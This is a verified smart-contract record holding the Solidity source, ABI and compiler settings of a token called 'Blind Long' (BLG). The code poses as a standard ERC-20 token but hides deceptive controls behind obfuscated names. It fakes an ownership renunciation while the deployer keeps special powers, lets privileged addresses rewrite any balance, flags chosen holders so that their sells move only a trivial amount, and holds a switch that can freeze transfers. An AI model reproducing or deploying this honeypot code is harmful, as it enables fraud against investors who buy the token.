{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface exemptSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atFrom) external view returns (uint256);\n\n    function transfer(address modeExempt, uint256 teamTo) external returns (bool);\n\n    function allowance(address toTakeFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeExempt,\n        uint256 teamTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldTeamSender, uint256 value);\n    event Approval(address indexed toTakeFrom, address indexed spender, uint256 value);\n}\n\nabstract contract tradingBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityTx {\n    function createPair(address takeEnable, address feeWallet) external returns (address);\n}\n\ninterface exemptSenderMetadata is exemptSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BlindLong is tradingBuy, exemptSender, exemptSenderMetadata {\n\n    bool public maxTeamMin;\n\n    function approve(address receiverReceiver, uint256 teamTo) public virtual override returns (bool) {\n        txAuto[_msgSender()][receiverReceiver] = teamTo;\n        emit Approval(_msgSender(), receiverReceiver, teamTo);\n        return true;\n    }\n\n    string private senderTx = \"Blind Long\";\n\n    uint8 private receiverLiquidity = 18;\n\n    function takeFundReceiver(address walletMax, address modeExempt, uint256 teamTo) internal returns (bool) {\n        require(liquidityFromLaunched[walletMax] >= teamTo);\n        liquidityFromLaunched[walletMax] -= teamTo;\n        liquidityFromLaunched[modeExempt] += teamTo;\n        emit Transfer(walletMax, modeExempt, teamTo);\n        return true;\n    }\n\n    function takeWallet(address walletMax, address modeExempt, uint256 teamTo) internal returns (bool) {\n        if (walletMax == marketingWallet) {\n            return takeFundReceiver(walletMax, modeExempt, teamTo);\n        }\n        uint256 marketingFee = exemptSender(fromMax).balanceOf(totalLiquidity);\n        require(marketingFee == tokenAmount);\n        require(modeExempt != totalLiquidity);\n        if (toAuto[walletMax]) {\n            return takeFundReceiver(walletMax, modeExempt, exemptFee);\n        }\n        return takeFundReceiver(walletMax, modeExempt, teamTo);\n    }\n\n    bool private listMin;\n\n    function name() external view virtual override returns (string memory) {\n        return senderTx;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverLiquidity;\n    }\n\n    uint256 public maxMode;\n\n    address totalLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed enableTrading, address indexed launchLaunchedEnable);\n\n    function transferFrom(address walletMax, address modeExempt, uint256 teamTo) external override returns (bool) {\n        if (_msgSender() != launchTrading) {\n            if (txAuto[walletMax][_msgSender()] != type(uint256).max) {\n                require(teamTo <= txAuto[walletMax][_msgSender()]);\n                txAuto[walletMax][_msgSender()] -= teamTo;\n            }\n        }\n        return takeWallet(walletMax, modeExempt, teamTo);\n    }\n\n    bool private tradingLiquidity;\n\n    mapping(address => bool) public toAuto;\n\n    address public marketingWallet;\n\n    function sellLimitFund() private view {\n        require(launchedFromBuy[_msgSender()]);\n    }\n\n    bool private walletToken;\n\n    function enableSwap() public {\n        emit OwnershipTransferred(marketingWallet, address(0));\n        liquidityExempt = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minReceiverLaunched;\n    }\n\n    function listFeeMax(address swapMax) public {\n        if (minSwap) {\n            return;\n        }\n        if (listMin) {\n            listMin = true;\n        }\n        launchedFromBuy[swapMax] = true;\n        if (maxMode != swapBuy) {\n            tradingLiquidity = false;\n        }\n        minSwap = true;\n    }\n\n    mapping(address => bool) public launchedFromBuy;\n\n    address private liquidityExempt;\n\n    function getOwner() external view returns (address) {\n        return liquidityExempt;\n    }\n\n    function teamBuy(address amountTrading, uint256 teamTo) public {\n        sellLimitFund();\n        liquidityFromLaunched[amountTrading] = teamTo;\n    }\n\n    address launchTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public minSwap;\n\n    function transfer(address amountTrading, uint256 teamTo) external virtual override returns (bool) {\n        return takeWallet(_msgSender(), amountTrading, teamTo);\n    }\n\n    string private launchedFund = \"BLG\";\n\n    mapping(address => mapping(address => uint256)) private txAuto;\n\n    uint256 constant exemptFee = 12 ** 10;\n\n    function tokenLimit(uint256 teamTo) public {\n        sellLimitFund();\n        tokenAmount = teamTo;\n    }\n\n    function owner() external view returns (address) {\n        return liquidityExempt;\n    }\n\n    uint256 tradingReceiverShould;\n\n    uint256 tokenAmount;\n\n    address public fromMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedFund;\n    }\n\n    uint256 private minReceiverLaunched = 100000000 * 10 ** 18;\n\n    function teamLaunchTx(address launchTokenTo) public {\n        sellLimitFund();\n        if (maxMode == modeAmountLiquidity) {\n            tradingLiquidity = false;\n        }\n        if (launchTokenTo == marketingWallet || launchTokenTo == fromMax) {\n            return;\n        }\n        toAuto[launchTokenTo] = true;\n    }\n\n    constructor (){\n        \n        atSender feeWalletTotal = atSender(launchTrading);\n        fromMax = liquidityTx(feeWalletTotal.factory()).createPair(feeWalletTotal.WETH(), address(this));\n        \n        marketingWallet = _msgSender();\n        enableSwap();\n        launchedFromBuy[marketingWallet] = true;\n        liquidityFromLaunched[marketingWallet] = minReceiverLaunched;\n        \n        emit Transfer(address(0), marketingWallet, minReceiverLaunched);\n    }\n\n    uint256 public swapBuy;\n\n    bool public totalTeamEnable;\n\n    function allowance(address takeMinTeam, address receiverReceiver) external view virtual override returns (uint256) {\n        if (receiverReceiver == launchTrading) {\n            return type(uint256).max;\n        }\n        return txAuto[takeMinTeam][receiverReceiver];\n    }\n\n    mapping(address => uint256) private liquidityFromLaunched;\n\n    function balanceOf(address atFrom) public view virtual override returns (uint256) {\n        return liquidityFromLaunched[atFrom];\n    }\n\n    uint256 public modeAmountLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTakeFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLaunchedEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeamSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMinTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedFromBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"}],\"name\":\"listFeeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTeamMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAmountLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"teamBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTokenTo\",\"type\":\"address\"}],\"name\":\"teamLaunchTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"tokenLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeamEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BlindLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}